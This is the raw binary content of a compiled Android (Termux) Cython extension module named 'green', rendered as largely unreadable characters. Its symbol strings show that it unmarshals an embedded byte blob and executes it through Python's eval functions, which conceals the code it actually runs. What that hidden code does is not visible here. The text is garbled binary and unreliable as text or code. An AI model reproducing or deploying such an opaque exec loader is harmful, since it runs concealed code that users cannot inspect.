X�
Yx
�
Y�
[x
�
[�
�
_�
�
[@
H
PH
X
Q 4P
4
0�4
<
P<
x
ip�0� 8i
`
0�`
x
ep�0� 80�
`
ep�e 8e`
x
i�
�
Z��h8xh��gTxg�4g�ftxf�f��P��j��i� l�4l� e�4e P��P�,P4�4@fPtft|�4�4t[t|�4Y4<]<�Y��f4f��g��X��ZX|�P0X0X8LPLxcx��P���c���P�ThX��XX`Ylxd��d��P�c�P�c �P� (c(0�P��P��0��0� (�0�0HPHxcx��P���c���P���P�0LQL�d���Q���d���Q���d���Q���d��Q�00�P�e��e��e��ex�c��c��c  c4@P@d<Dx�Dgd�e��ex�e��ex�P��P��X��f��f��fc$dc$d\xPx|d|��P���d��d4XdXh�P�\�Q��c��c��c�c4Xc��0���d��0���0��4d4h0��|0�|�d��e��0���0��4e4h0�\�0��(c<�c�c4Xc��c4cLhP��e4e%4I?:;$>4I:;I!I7$>4I:;	:;
 
I:;8I:;I
:;
I:;8
I:;8:;&I'II'I:;I:;(
:;<I'..@�B:;'I:;I4:;I 
:;!1XYW"41#41$%1&1UXYW'1(1XYW)
1*U+41,��1-��1.���B/���B04I:;1:;2
I:;83!I74:;5
I:;
86.@�B:;'I?7��1�B8.:;'I<?9.:;'I :4:;I;.:;' <:;I=.:;'I<?>.:;'<??.:;'I<?@.:;'<?AB.:;'6I C
:;D.:;'6 EF.@�B:;'6IG���BH��1�BI1UXYWJ4:;IK.:;'6I L:;I�<����l�@�	x��Y�	]el��
��	��	Ah
K
��
L
-P
M(
;P
N0
�n
O8
*
�
P@
��
QH
�f
 
RP
9�
SX
�3
T`	�
1	�(
,
WB
-
a�
.
�n
/
&q
0 M(m	�i
nk
E�ly�k�����B��	���KB
�
��
W(�
�P�
�n� 
Mn�(
Z�0
�n�8
^v�@
���H
,��P
�r�X
�}�`
���h
|��p
�	�x
�g׀
�r؈
�9	ِ
D	ژ
TO	ݠ
	_
�
�P�
-f
�
����
*�
��
�n��
*�
��
��
��
�
��
Y/��
�9��6��Dq������Ln� d�(��0�83@2�HqP�qX�q`�
qh�q	p#
Z
x�J
�bZ��Q�3�vs
WBt
�nuUeeJ�jqB����qq�e����@q�q���� �
��
��
�
� ���qq+U�0EqqmQ_@{i\vq������ h
8Gm
bGn
"Go
%Gp
�Gq 
?gr(
^s0
�t8
u@
��vH
YwP
�GxX
�Gy`
�Gzh
�G{p
G|x
n}�
�~�
��
�G��
hG��
jG��
�G��
�g��
�
G��
�G��
�G��
�G��
G��
uG��
G��
�
G���G�.��G�lG�R�
�WqqqrH�wqqqq����@q����P�
�5�
:G�
�P�
�P�
��� 
�p�(
��0
���8
�G�@
�P�H@��Enq[��`qqn{��@qnq����@qq��c��
�	5�
�
G�
 
������@qqq	��#	.	qn�tR	����T	_	���
�|	�

C
��	
@�	@q�	@�	�	�>	�P1
��2
q3
n4
n5
�@7 
7@8$
��9(
2>
:0
�>
;8
>
<@
�
�=HnN
tAS
q�	�q
��v
@q�
��
9��
@q��
���
qqq@8����
	� #
�P$
�$%
�@&
�P(R4*>	(
aP
�

<�
�P
C� ��
�qq��D	�@qq��r��>��K�����q�nZ�q�qq>��C�T\lCaqq{�q�q_
	.�q��
�*�	�
=
�@
>
X�
?4
��	���l�
�	@�
l��
@1
�	�elO
�	�elm
�	BelO
�	��
�	�el	O
�	,�
�	�el�
�	el�
�	��!�	p�,�C�+I�	�el_q���#�	4elN��	�el�

	��	3el�	�el
P�m��@A�C��#`�
qC��#h9��q��@c	��P�	u�@w
��q���q�e�q a4� �m��!�.����"��.#Q/#�/#�/#K+/$d�$"�8/"�D/!�%�%d�%!�%�%P�%!�%$�%P�%&�%�%P�%!~/p��!^/p��#'�l/$L�4$Qq(�/��%&�/�9'��/'��/'\�/#Z�/#��/#��/#0#�0)0�!k&��(�%�7	!k&��(�%�7	&!0 g'�70#'[0#�g0#�s0#�0# �0#i�0)�0T�&�0p'[�0'}�0#�0#\�0#e�0#��0#�1&1�[%d%1*�#1&V1 e!'}c1'�o1#�{1&�%Ph	'B�%!�1��`u%d�1%i�1%j�1%h�1#��1#��1#�1!k&��B%Pt&!�%��7	%P�%!k&��C%gt&!�%��7	%g�%!k&ȡD%ft&!�%̡7	%f�%&�1�'7�1#��1+2&2��'z%2'�12'D=2#mI2#�U2#�a2!1�	%d%1&n2�'B|2'[�2#��2#��2)�2<�&k& %it&&�%P7	'��%!k&<�%it&!�%<�7	%i�%!�1��`$	%d�1%h�1%g�1%f�1#��1#��1#��1!k&��B%Pt&!�%��7	%P�%!k&ԣC%jt&!�%أ7	%j�%!k&�D%it&!�%��7	%i�%&�2�%	'�2'Q�2#��2#��2# 3!2$�|�%P%2%X12%l=2#�I2#0U2#}a2$(�(#� 3!�%4��	'� �%*�#�!3!k&T�
%ht&!�%X�7	%h�%!k&t� 
%gt&!�%x�7	%g�%!k&��!
%ft&!k&T�1%et&!�%T�7	%e�%!k&l�2%ft&$��h �iq(�%��i!�%D�<%d�%!�%|�C%d�%&V1�E'�o1#�{1(�%��G!�%�J%f�%&�%0N'�%&�%pO'G�%!�%4�R%c�%!�%x�\%f�%!k&��b't&!�%��7	'G�%!k&�d(�%�7	!k&4�c(�%4�7	,p.��,/3��-:3ؘ.T:.S3.Q5.P�-:3t�.Q�.U�.S�.P�-W3��.R1.Q�,r3��,�3��,�3̚-�.��.P�,�3�,�3<�,�3d�,�3��,�3��,�3�,�3�,4�,!4H�,=4P�,H4d�-�.|�.P�-^4��.P1,p4��,�.��,�4̜-�4�.S�.R�.Q�.P�-�4��.P�,�4��,p.ȝ-�4@�.R�/X��-�4Ԟ.P�,�5��-�7�.Q�.P�,�4P�-�4h�.R�/X`�-�4p�.P�,�9��,,:��,C:�,,:X�,�.d�,!4��-�:P�.S�,�:\�-�:t�.R�-
;<�.Q�.P�-*;T�.P�-�:��.R�,;;Ԥ-Q;��.P��fD_
�,m
g	�Y�
	�
�
	=elL�
�	�0�4�Pl	q���#�q���# Kq���#(�
q���#0nq���#8�q���#@T��	X��l
�e�1(�2�m�24P�2�_�2P�2�U� 2B
U�!2I
U�"n�q���#�~��	�Ul
�q���#����	�Uloq�	����	�Ul�(�	�UlhJ�	�Ul	l�	�Ul J�	�^q���#�*	��	�U3lOb�J�	9�0�P�0u@�0@�q���#Hq���#P�q���#X^ �	�el�q���#p� +	�el� 2	�el+�q���#x� @	�el(!N	cel<$!g	el=@q���#�A�_��#��
q_��#��!�&�����#���#��4�}2z@~2�@2%�!��!�!|1y2"z2�@{"""j
		j�
WB
�@
@
v@
�@
�@ 
�@$
�@(
q0
�q8
�q@
�qH
1qP
�q X
O>
&`
R	q'h
[q(p
�q)x
^	�+�
)q,�
�
�0�
W#<�
{c#=�
@>�
�\#?�\#h#s#__m
�	!�#�	Mel0�P��#�#�0
 
WB
*n
��
�$ 
6m(
$$�m	$*$=�0U
WB�
�n�
).	�
�^$� �5@J�5
J�5�J�5�J�5wJ�
��$�(�$J2	J(�$�$7(
W(
�m
-n %B%#% 
W(
�@%
qlQ%\%M(
W(
�.	
�� 6�o�q7�%(�8�
(q�%�9[�@:}	�!;�<��q;z�<��q9��@<c�q<��q<'�P<�	�P<��@:��@:X�q;�4<�4q(�(m��qc�q<?��<u��q���qN��q X��&�%�	#��%!�%���%c�%&�%0�'+�%&	&`�	'�&'�"&'P.&'F&#sR&#�^&&�%��	'	�%&	&��	',&'b"&'�.&'�F&#R&#U^&&�%��	'��%&	& �	'�&'�"&'g.&'-F&#�R&#�^&&�%P�	'3�%&	&��	'V&'�"&'.&'�F&#ER&#�^&!�%�8�	'�%!k&��(�%�7	,�*D�,_.L�,p.|�-�.��.P�,�.ĕ-�.�.P�-�.�.P�-�. �.R�.P�-�.P�.P�-�.l�.R�.P�-�.��.P�-�.��.R�.P�-�.�.P�-�.�.R�.P�,�.x�,�.��-�.��.P�,�.��,�.��-�.��.P�,�.З,�.ؗ-�.�.P�,�.��,�.�=DF�*�*�*`
�<
�M,?
�M,@
/R,A
!g,D
�@E 
�@F$
�@G(
8@L,
��-P0
.�-R8
G�-S@
�qTH
�qUP
�qXX
SqY`
0qZh
�	._p
�Z.c�
Jqe�
�@g�
:qi�
�_
j�
�	@l�
Dqm�
�>��
����
W@��
�q��
�q��
:q��
@���U����-��*W,b,��l,w,�
�h
W(
VZ-
�" 
}q (
&q!0
�q"8
-m#@
Kq$H
�@%P
�e&T
�e'U
�q*X
P
@,`
�	@-d
1@.h
�_-/l
'q-0p:@%1`w,j-��}-l�-�	
�@
�@
�@�-�-�+	6
I@)
��-*�-�-�
�-@qg,@q.�8	a -
q4
]q4
<q4
SU.6..8�.!R,>�
qP?AqqP8�	
qq8�
qq8:@qPq8X
#@q@9B�
@:�
1
:��
@:��
P:�
@:��
@A:g�
1
:L�
R/el�B�@<4y/�9�"@C%9!
@CB6�q<a�q<
�q<X�@:�q:��q:��q: �q: �qCX�D�<�P<�@<\@<>P:d":�g,:��*:�q:qq:qCX09�R@<�R�*<�R@:pVm:�Sq:�Tq:qTq:TqA:weq;CF<�F�*<Fm<XFm<TFm9+�q<�q<��q:h��;�:<�:�*<:q<X:q<T:q:O;q:;q:;q9;
�"<��@:^�@:�"9o
{@<%{�!<z{@<�{@:R
|@:G|@:�	|@Bk�"<��P<��@<\�@<>�P:��q:d�"CX;V
�<��@<�":%��!:^�@:�@A:b�"A:%�@=�6P?6@��PE8�@qPn8�qn8o
"qPn8-�qPn8�
+qP?X@qPq?]qP?IjqPnPP?o.	q?@qqq=�"q8�9qqP8"#qnE8Zqn=�q8x<qqqqq@?�@q=�q8�@qqqFL��m&q�"�&qp#�&q7$Y&q[$�(g�$�'q,y;|�Ge��.Q�.P�,�;��H�;̧.Q�.P�,�4Ч,p.��\m,�q%��q#%��qY%�n X��!�%@��%c�%*��%a�q*V&X�q&�;@�'�%�;'�%�;!V1���%Pc1%eo1#3&{1!�%���%f�%!�%��%d�%!k&��%dt&!�%�7	%d�%!k&(��'�&t&!�%(�7	'�&�%,�;P�-�;��.Q�.P�GX��.Q�-�4Ȩ.R�.Q�.P�-,:ب.Q�Fx�m�
9q'n9q�'�9qG)C9q((Y<��(4;q�)�:qCXxI�;�K	*�J�)W[<&k&�u	'*t&!�%4�7	%e�%,(<��-�4�.Q�.P�,b;T�,p.��-3<��.P�-E<��.P�-�<Ȫ.S�.R�.Q�.P�.T�-E<�.P�-�<,�.S�.R�.Q�.P�-�<`�.R�.Q�.P�FԦxmpq�!aq�"�<<oms"�q!�%�%P�%,�4(�HC:<�.P�?�qqqT��mM�q� a�q�!��q&V1��'F!c1#|!{1/Y��,,:��-b;Ħ.R�?qPE?�
�Pq8�	�"PP@8fFg,�*"qq8l 	@g,8�!6���8%!4��8x�qqPE8/"C@P@2"D8�#�qqqq9H~q<n~q<�~q?r'qq8}"@qqKE�@LV�	%L�<#<�=�"q?�
�qq8}$@V<[<f<�%%
�@%
,@%8�
&,qP@qqV<8'
qqqq�<�A
U�$dhl����� Ld $ld�PTXlp��������4��(,4<�����	�$�8x�4�$�8� ,$�8H4H8@hlp��
x
�
�
x
�

x
p� 8X
\
`
x
X
\
`
x
� �4����l	p	t	|	�	�	���	�	�	
�
�


�
�
LPTl��X���p���ptx�������(l��4��4__pyx_moduledefnb_reservednb_inplace_ortp_richcomparem_clear__pyx_dict_version__pyx_string_tab__Pyx_StringTabEntrycountco_opcache_size__pyx_cfilenmob_sval_Py_XDECREFnextf_codepreviousgilstate_counterrt_from_callPyErr_WarnExnb_rshiftnb_inplace_powermp_ass_subscriptPyCFunctionPyMemberDeftp_basedescrsetfuncinitprocunsigned intm_init__pyx_k_main__pyx_linenoPyDictObject__Pyx_copy_spec_to_module_framec_traceobj__Pyx_ErrRestoreInStatePyMem_ReallocargcharPy_ssize_tsq_lengthsetattrofuncitemsizegetdescrgetfuncm_copym_namesma_valuesinterneduse_tracingidbadpy_linepy_codePyTraceBack_HerePyDict_ContainsPyCompilerFlagsclang version 15.0.1ssize_ttp_vectorcall_offsetnb_lshiftssizeargfuncsq_inplace_repeatbufdocPyGetSetDefco_code__Pyx_CodeObjectCacheEntryinterp_cframefilenamestart__Pyx_GetBuiltinNamenb_subtractnb_intnb_floor_divideobjobjargproctraverseproc__pyx_moduledef_slotsn__pyx_k_importco_constsob_itemPyInterpreterStatef_stateb_handlerpy_frametmp_valuetmp_tb__Pyx_PyObject_Call__Pyx_Globalssq_concatsetter__pyx_empty_unicode_PyOpcachePyCodeObjectreadyf_builtinsf_trace_linesPy_tracefunc_tsattr_namePy_GetVersionPyDict_New_py_tmptp_nametp_as_sequencesq_containsPy_hash_ttp_calltp_methodstp_bases__pyx_clinenohashc_profilefuncexc_tracebackdicttmp_typePyObject_SetAttrStringPyObject_HashPyEval_MergeCompilerFlagsam_awaitnb_xorsq_inplace_concattp_hashml_flagsslot__pyx_empty_bytesco_argcountPyDictKeysObjectprevPyErr_CleartypePyObject_SetAttrPyMem_MallocPy_LeaveRecursiveCall__Pyx_GetAttrobnb_invertPyMappingMethodsreleasebufferproc__pyx_k_testco_stacksizeresultf_trace_opcodesstackcheck_counter__Pyx_InitGlobals__Pyx_AddTraceback__Pyx_CLineForTracebackPyUnicode_FromFormatPyInit_greencftp_as_asyncnb_addnb_powerternaryfunctp_as_buffernameuint64_t__pyx_n_s_importco_nlocals__Pyx_CodeObjectCacheop_isrecursion_depthcframeCFramecurexc_typeasync_gen_finalizerPyModule_GetDictfunc__pyx_module_is_main_greentp_deallocnb_multiplynb_indexndimset__pyx_n_s_testco_cell2argco_namespectp__Pyx_CreateCodeObjectForTracebackPyErr_OccurredPyEval_GetBuiltins__pyx_t_3getattrfunctp_setattrsq_ass_itemPySequenceMethodstp_strtp_getattrogetattrofunctp_flags__pyx_empty_tuple__pyx_k_s_d_d_l_Z_e_e_d_d_S_Nsa_s_d_d_lco_filenameco_zombieframe_dictkeysobjectcurrent_idto_namef_linenoPyTryBlockexc_statetrash_delete_nestingPyModule_NewObjectendPyCode_NewEmpty__kernel_long_tmp_lengthgetbufferprocbf_releasebuffertp_delm_methods__pyx_methodsis_strinternf_lastiPyErr_ExceptionMatches__pyx_bisect_code_objectsPyUnicode_AsUTF8String__Pyx_PyExec3__ARRAY_SIZE_TYPE__nb_inplace_lshiftmp_subscriptgettertp_subclasses__pyx_dict_cached_value__pyx_n_s_maincode_objectco_weakreflisttracingcontext_vermessagetbob_basePySendResultnb_inplace_matrix_multiplysq_itemformatPyBufferProcstp_weaklistoffsettp_newfreefunctp_mrotp_vectorcallm_slots__pyx_cython_runtime__pyx_n_s_loadsco_opcache_flagPyTupleObjectf_globalscurexc_tracebackPyObject_GetAttrStringlevelpostmpPyFrame_NewPyObject_DirPyEval_EvalCode__pyx_pymod_createglobalssetattrfuncunaryfuncPyAsyncMethodsnb_inplace_andstridesPyModuleDef_Base__pyx_f__pyx_n_s_cline_in_tracebackkind__Pyx_InitCachedConstants__pyx_find_code_objectmid__pyx_insert_code_objectPyBytes_FromStringAndSizePyImport_AddModulePyUnicode_AsUTF8PyRun_StringFlagsbinaryfuncnb_inplace_floor_divideinternal_typeobject__pyx_dco_extraunsigned char_Py_INCREFframef_blockstackt__Pyx_Import__Pyx_ErrFetchInStatecodetp_getattrPYGEN_RETURNPYGEN_NEXTnb_inplace_addnb_inplace_rshifttp_clearint64_t__pyx_n_s_builtinsco_firstlinenoco_cellvarssigned charfound_dotmodulec_linedict_versionob_refcntam_anextnb_remaindershapegetiterfunctp_dicttp_dictoffsetnewfunctp_finalize__pyx_bco_kwonlyargcountma_version_tagcompactPyFrameStateexc_info__Pyx_InitStrings/storage/emulated/0m_basenb_positivelenfuncbf_getbufferobjtp_freesize_t__int64_t__pyx_k_nameallocatedPyListObjectPyThreadState_Getf_backexc_valuertversionpvaluePyErr_FormatPyObject_Call__pyx_pymod_exec_green__kernel_ssize_thashfuncbufferinfotp_iternextPyMethodDefpasciif_stackdepthon_delete_dataPyDict_SetItemStringlistnew_maxPyUnicode_FromStringAndSizePyUnicode_DecodePyList_New__pyx_t_1dict_cached_valuenamesreprfuncnb_boolwas_sq_sliceunsigned longrichcmpfuncml_nameco_namesco_varnamescode_linewstrf_genthread_idPyErr_SetStringifrom_listptracebackPyTuple_PackPy_EnterRecursiveCall_Py_IS_TYPEmoduleskwPYGEN_ERRORnb_inplace_subtracttp_as_mappingiternextfuncml_doctp_alloctp_cachem_indexm_sizem_traverse__uint64_tis_unicode__pyx_n_s_marshal__pyx_tuple_c_profileobjexc_typeempty_dictempty_list__Pyx_PyObject_GetAttrStrob_typetp_itemsizetp_memberstp_initvectorcallfuncco_opcachelengthstateob_shashPyModuleDef_Initb_levelPyFrameObjecton_deletefuncnamepy_funcname/sdcard/green.cinquirynb_floatssizeobjargproctp_setattrosuboffsetstp_itertp_is_gcm_docPyModuleDefPyBytesObject__Pyx_check_single_interpreter_Py_DECREFf_localsrecursion_headroomPyInterpreterState_GetIDtstateam_aiterPy_buffertp_weaklist_object__pyx_k_loads__pyx_filename__pyx_n_s_name__pyx_code_cacheentriesf_valuestackf_localsplusc_tracefuncprevious_item_err_stackitemcython_runtime_dictPyImport_GetModuleDictcallobjobjprocreadonlytp_docml_methallocfunctp_version_tagPyModuleDef_Slotm_freemain_interpreter_id__pyx_k_marshalco_opcache_mapfrom_namef_iblockasync_exctrash_delete_latercoroutine_origin_tracking_depthuse_cline_objPyDict_GetItemString__pyx_L0sq_repeattp_getsettp_descr_getco_flagsco_linetableallow_noneasync_gen_firstiterroot_cframectversion__pyx_L1_errorPyOS_snprintfcf_feature_versiondeflocalsdestructorsendfuncnb_negativenb_inplace_multiply__pyx_k_builtins__pyx_k_cline_in_tracebackma_keysmoddictb_type_PyErr_StackItemsameglobal_dictptypeuse_clinePyTuple_Newtp_basicsizenb_absolutenb_ornb_true_dividetp_traversevisitprocclosurePyTypeObjectvalue__pyx_kp_b_s_d_d_l_Z_e_e_d_d_S_Nsa_s_d_d_lmax_countPyObject_NotPyObject_GetAttrcf_flags__pyx_pyinit_moduleintam_sendtp_as_numbernb_inplace_xorPyNumberMethodswas_sq_ass_slicelentp_descr_setPyObjectco_freevarsPyASCIIObjectf_tracecurexc_valuePyThreadStateo__Pyx__GetModuleGlobalName__pyx_t_2longob_sizePyVarObjecttp_reprnb_divmodnb_andnb_inplace_remaindernb_inplace_true_dividenb_matrix_multiply__pyx_mencodingco_posonlyargcountma_usedwchar_tcontext__Pyx_check_binary_versionPyUnicode_InternFromStringPyImport_ImportModuleLevelObjectPyDict_SetItemmodname7v�
/sdcard/data/data/com.termux/files/usr/include/asm-generic/data/data/com.termux/files/usr/include/sys/data/data/com.termux/files/usr/include/python3.10/data/data/com.termux/files/usr/include/python3.10/cpython/data/data/com.termux/files/usr/lib/clang/15.0.1/include/data/data/com.termux/files/usr/includegreen.cposix_types.htypes.hpyport.hobject.hobject.hmethodobject.hdescrobject.hstddef.hmoduleobject.hstdint.hcode.hcode.hdictobject.hunicodeobject.hlistobject.htupleobject.hbytesobject.hpystate.hpystate.hframeobject.hpyframe.hpyerrors.hdictobject.hpylifecycle.hwarnings.htupleobject.hbytesobject.hunicodeobject.himport.hlistobject.htraceback.hpymem.hceval.habstract.hceval.hcompile.hpythonrun.heval.h	��
 
(�6
]tKJJ	K��

�	I
�	��tJ�J]J	#JL��xJ��	��tJ�J	�xJ�J	�xJ�R��K	��tJ�J	��tJ�J	�x<�J	�xJ�R�|��J	��tJ�J	�x<�J	�xJ�R�|��J	��tJ�J	�x<�J	�xJ�R�|��J	��tJ���	�xt��|J���R�|��J'dt�J	KxJ	�'O�J	KxJ	�'O�J	KxJ	�'O�J	KJ	�xt��|��Jz
	$�t��JJ	K�J���tJ ����
�NJ~
JNJ~
JNJ~
JNJ�j��$+J	R��J�j��JzJJ�j�.�J�zJJ�j��JzJJ�j�.���zJJ��j��JzJJ.��zJJ��jJ.���	L$�u<N�+�K�=�K�A�J

�vJ�wJ
��J,J�wJ
���@��wJ���MJ�wJ�J�w���7JJJ�sJ�� JJ
JKJ7KJ�iJ��J8�:JJ�iJ��J
J�i���K�i���Jz��iJ��J
JLJh�J�v��#KJ	JJN7J
K�s�
�J	JK<"�}J�"�JJ�JJ�J�J�J
K�rJ$�
JJ	K�rJ�
J	�J�r���J	K��J	�~J�J	�~JqJJnJFNJ	K�qJ	�J��N$�2�=�@��q���JKJ���sJ	�(�R���J�R;��L�JJJJ	�wJ�R���w��	�4�J�J	zJ4�J	�JK�rJJ�J	�wJ�R.��J.JJ�sJG���sJ	�JR��$J�sJ�J	�w��J	�wJ�J��J	�wJ�R��0J�sJ�JJJ�s���	�wJR�|��<��x��R���sJ	�<�|J;�TQ��~J	KJK�rJ�JK	�u��
J	�uJ�R�|��J(�q��t�s��
J�rJJ�J�sJ��@��sJ	�<�|��
t�rJ�J	N!P�!J7JJ�q��JMIM	�uJ�J�R�J�J�R���J�R&���~�!J	JPM)fJK.J	�L�LFN	�JO
��pJ�J
K�pJ�J	�s��J	�sJ�R�|��J�qJ���%J�&K
��K�pJ#���	J1
J4�	�4�1��pJ	��G	�G�o�	�JLIK	�sJ�R���{J��
��~JMIM	�uJ�J�R�J�J�R���J�R�|����pJ	�JPJ)LJK.J	���qJ���%J�&K
��K�pJ#���	J('J+�	�4�	�2�9L0I
L"M�"G$KL=�IK���HKK�pJ	�J�R���J�R�|��J�J�R���J�	�wJ��|J�J
J�s���0��
�&K(=$K"K$K�pJ��*J"K	�tJ�R�|��
�2
���2�J�JQ	zJJK�rJ	�
JR���rJ	�
JK	J�	�Q#�(
��QJ(JJK	��uJ�
�m�JJ�q��J�
��q�'�J	KL�L=KPu<�	J�qJ�J
8	I
�	��qJ�J�<
?��rJ
�
�	KL�nJ���nJ��PLHL
�	fJ-J	eJ�|�	KJK�r��JP�n�	�����Rx��Rx��|<�J�nt���t
$�oJ���J�	J�		�<%K9J
��o��J	�J�pJ	�J�o��J
�JPN
J�o�
�<��
J�
��oJ��IK�o��J
JF
NJK�o<	���{��<�ot
�JF
NJM�o<	���J�R�|��J�o����o<��
��
��!P�4
ԔFP�K��P��U�Z��_p�rpw��|������
̔�
ܔ
�#
�DP�����
����h�
(�(�p�
P�+X��<
L��P
�\^
x�l
Ԧx�
T���
��x������� �@�0�
]�
��X��
����

�
�'
�	4
�D
�	Q
�Oby
9�	������������������������������,��;��J�\������ ��(��0��8�@�<H�gP��X�������������"
���2Qx�]`�bx�i
�v�������
0?Tkw�������:KYx�t�������&6ERap��������			*	7	M	c	q	�	�	�	�	�	�	�	

.note.android.ident.dynsym.gnu.version.gnu.version_r.gnu.hash.hash.dynstr.rela.dyn.rela.plt.rodata.eh_frame_hdr.eh_frame.text.plt.data.rel.ro.fini_array.dynamic.got.got.plt.data.bss.comment.debug_loc.debug_abbrev.debug_info.debug_ranges.debug_str.debug_line.symtab.shstrtab.strtabcrtbegin_so.c__on_dlclose$x.1__dso_handle_const__on_dlclose_late$d.2$d.3$d.4$d.5$d.6note_android_ident$d.0note_datanote_namenote_endndk_versionndk_build_numbergreen.c$x.0__pyx_moduledef__pyx_pymod_create__Pyx_check_single_interpreter.main_interpreter_id__pyx_pymod_exec_green__pyx_string_tab__Pyx_PyObject_Call__Pyx_Globals__Pyx_PyExec3__Pyx__GetModuleGlobalName__Pyx_GetBuiltinName$d.1$d.2$d.3__pyx_methods__pyx_moduledef_slots$d.4$d.5$d.6__pyx_k_cline_in_traceback__pyx_n_s_import__pyx_k_import__pyx_k_loads__pyx_k_main__pyx_k_marshal__pyx_k_name__pyx_k_s_d_d_l_Z_e_e_d_d_S_Nsa_s_d_d_l__pyx_k_test$d.7$d.8$d.9$d.10$d.11__pyx_code_cache.0__pyx_code_cache.1__pyx_m__pyx_empty_tuple__pyx_empty_bytes__pyx_empty_unicode__pyx_d__pyx_b__pyx_cython_runtime__pyx_n_s_name__pyx_n_s_main__pyx_n_s_marshal__pyx_pymod_exec_green.__pyx_dict_version__pyx_pymod_exec_green.__pyx_dict_cached_value__pyx_n_s_loads__pyx_tuple___pyx_n_s_test__pyx_n_s_builtins__pyx_n_s_cline_in_traceback__pyx_kp_b_s_d_d_l_Z_e_e_d_d_S_Nsa_s_d_d_l__Pyx_CLineForTraceback.__pyx_dict_version__Pyx_CLineForTraceback.__pyx_dict_cached_value__pyx_code_cache.2$d.12$d.13$d.14__FRAME_END__$d.1__cxa_finalize__emutls_unregister_key__atexit_handler_wrapperatexit__cxa_atexitpthread_atfork__register_atfork__dso_handle__bss_start_end_edataPyInit_greenPyModuleDef_InitPyThreadState_GetPyInterpreterState_GetIDPyExc_ImportErrorPyErr_SetStringPyObject_GetAttrStringPyModule_NewObject_Py_DeallocPyModule_GetDictPyDict_SetItemString_Py_NoneStructPyExc_AttributeErrorPyErr_ExceptionMatchesPyErr_ClearPyExc_RuntimeErrorPy_GetVersionPyOS_snprintfPyErr_WarnExPyTuple_NewPyBytes_FromStringAndSizePyUnicode_FromStringAndSizePyImport_AddModulePyObject_SetAttrStringPyUnicode_InternFromStringPyUnicode_DecodePyObject_Hash__pyx_module_is_main_greenPyObject_SetAttrPyImport_GetModuleDictPyDict_GetItemStringPyTuple_PackPyList_NewPyDict_NewPyImport_ImportModuleLevelObject_PyThreadState_UncheckedGet_PyObject_GetDictPtr_Py_FalseStruct_Py_TrueStructPyObject_NotPyErr_OccurredPyDict_SetItem_PyDict_GetItem_KnownHashPyObject_GetAttrPyUnicode_FromFormatPyUnicode_AsUTF8PyCode_NewEmptyPyFrame_NewPyTraceBack_HerePyMem_ReallocPyMem_Malloc__stack_chk_failPyExc_NameErrorPyErr_FormatPy_EnterRecursiveCallPy_LeaveRecursiveCallPyObject_CallPyExc_SystemErrorPyObject_DirPyDict_ContainsPyExc_TypeErrorPyEval_GetBuiltinsPyCode_TypePyUnicode_AsUTF8StringPyEval_MergeCompilerFlagsPyRun_StringFlagsPyEval_EvalCode_DYNAMICpp�����o�	�	�*���o�
�
 9���o�
�
0C�
�
XI8
8
�Qx[Bxxpe2��ZemD�D�|{������������������P�P�����������������X��������ؤ��x�x���0x���>�6*�t���I��<�" 0B��2;0D�V&S80PT+

